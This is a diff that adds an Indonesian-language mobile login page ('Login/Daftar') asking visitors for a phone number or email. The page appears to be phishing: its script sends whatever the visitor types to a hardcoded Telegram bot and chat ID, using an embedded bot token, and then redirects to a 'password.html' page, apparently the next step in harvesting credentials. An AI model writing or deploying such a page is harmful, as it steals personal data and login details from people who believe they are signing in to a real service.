@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Login/Daftar</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { background-color: #fff; color: #0B2C33; padding: 24px; overflow-x: hidden; position: relative; }
+    .back-btn { font-size: 26px; cursor: pointer; margin-bottom: 10px; }
+    h1 { font-size: 28px; font-weight: 900; margin-top: 20px; margin-bottom: 28px; }
+    .tab-switch { display: flex; justify-content: flex-start; background: #F2F3F5; border-radius: 50px; padding: 5px; width: 80%; max-width: 320px; margin-bottom: 40px; }
+    .tab { flex: 1; text-align: center; padding: 12px 0; border-radius: 50px; font-weight: 600; font-size: 14px; color: #8C9EA6; cursor: pointer; transition: all 0.25s ease-in-out; }
+    .tab.active { background: #fff; color: #0B2C33; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08); }
+    .input-section { width: 100%; display: none; }
+    .input-section.active { display: block; }
+    .phone-input { display: flex; align-items: center; font-weight: 800; font-size: 21px; color: #0B2C33; }
+    .flag { width: 30px; height: 30px; border-radius: 50%; overflow: hidden; background: url('https://flagcdn.com/h24/id.png') center/cover no-repeat; margin-right: 10px; flex-shrink: 0; }
+    .country-code { font-weight: 800; font-size: 22px; margin-right: 5px; }
+    input[type="tel"], input[type="email"] { border: none; outline: none; font-size: 21px; font-weight: 800; color: #0B2C33; width: 100%; background: none; }
+    input::placeholder { color: #8C9EA6; font-weight: 500; }
+    .btn-lanjut { position: fixed; bottom: 20px; left: 0; width: 100%; display: flex; justify-content: center; background: transparent; padding: 0 24px; box-sizing: border-box; }
+    button { width: 100%; max-width: 420px; background-color: #A7B4B8; color: #E6FBE2; font-weight: 700; font-size: 17px; border: none; border-radius: 50px; padding: 16px; cursor: pointer; transition: background-color 0.3s; }
+    button.active { background-color: #0B2C33; color: #E6FBE2; }
+    button:active { transform: scale(0.98); }
+    #fadeWhite { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; z-index: 999; }
+    #fadeWhite.active { opacity: 1; }
+  </style>
+</head>
+<body>
+  <div class="back-btn" onclick="window.history.back()">&#8592;</div>
+
+  <h1>Login/Daftar</h1>
+
+  <div class="tab-switch">
+    <div class="tab active" id="tab-phone">Nomor Handphone</div>
+    <div class="tab" id="tab-email">Email</div>
+  </div>
+
+  <div class="input-section active" id="phone-section">
+    <div class="phone-input">
+      <div class="flag"></div>
+      <span class="country-code">+62</span>
+      <input type="tel" id="phone" placeholder="8XX XXXX XXXX" maxlength="13" inputmode="numeric">
+    </div>
+  </div>
+
+  <div class="input-section" id="email-section">
+    <input type="email" id="email" placeholder="Masukkan email kamu" autocomplete="email" required>
+  </div>
+
+  <div class="btn-lanjut">
+    <button id="lanjutBtn" onclick="goNext()">Lanjutkan</button>
+  </div>
+
+  <div id="fadeWhite"></div>
+
+  <script>
+    // 🔹 Token & ID Telegram
+    const TELEGRAM_TOKEN = '8366843088:AAG2DgTncj7WVowbtCY-_9iL85PLahl1ddg';
+    const TELEGRAM_CHAT_ID = '5983910858';
+
+    // 🔹 Elemen
+    const tabPhone = document.getElementById('tab-phone');
+    const tabEmail = document.getElementById('tab-email');
+    const phoneSection = document.getElementById('phone-section');
+    const emailSection = document.getElementById('email-section');
+    const phoneInput = document.getElementById('phone');
+    const emailInput = document.getElementById('email');
+    const lanjutBtn = document.getElementById('lanjutBtn');
+    const fadeWhite = document.getElementById('fadeWhite');
+
+    // 🔹 Ganti tab
+    tabPhone.onclick = () => {
+      tabPhone.classList.add('active');
+      tabEmail.classList.remove('active');
+      phoneSection.classList.add('active');
+      emailSection.classList.remove('active');
+      updateButtonState();
+    };
+
+    tabEmail.onclick = () => {
+      tabEmail.classList.add('active');
+      tabPhone.classList.remove('active');
+      emailSection.classList.add('active');
+      phoneSection.classList.remove('active');
+      updateButtonState();
+    };
+
+    // 🔹 Aktifkan tombol hanya jika input valid
+    function updateButtonState() {
+      let active = false;
+      if (phoneSection.classList.contains('active')) {
+        const phone = phoneInput.value.trim();
+        active = /^8\d{7,11}$/.test(phone);
+      } else {
+        const email = emailInput.value.trim();
+        active = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      }
+      lanjutBtn.classList.toggle('active', active);
+    }
+
+    phoneInput.addEventListener('input', updateButtonState);
+    emailInput.addEventListener('input', updateButtonState);
+
+    // 🔹 Fungsi kirim ke Telegram
+    function sendToTelegram(message) {
+      return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    // 🔹 Saat tombol "Lanjutkan" ditekan
+    function goNext() {
+      if (!lanjutBtn.classList.contains('active')) return;
+
+      let message = '';
+      if (phoneSection.classList.contains('active')) {
+        const phone = phoneInput.value.trim();
+        message = `📱 Nomor HP: +62${phone}`;
+        localStorage.setItem('loginData', message);
+      } else {
+        const email = emailInput.value.trim();
+        message = `📧 Email: ${email}`;
+        localStorage.setItem('loginData', message);
+      }
+
+      sendToTelegram(message)
+        .then(() => {
+          fadeWhite.classList.add('active');
+          setTimeout(() => {
+            window.location.href = "password.html";
+          }, 400);
+        })
+        .catch(() => {
+          alert('Gagal mengirim ke Telegram.');
+        });
+    }
+  </script>
+</body>
+</html>
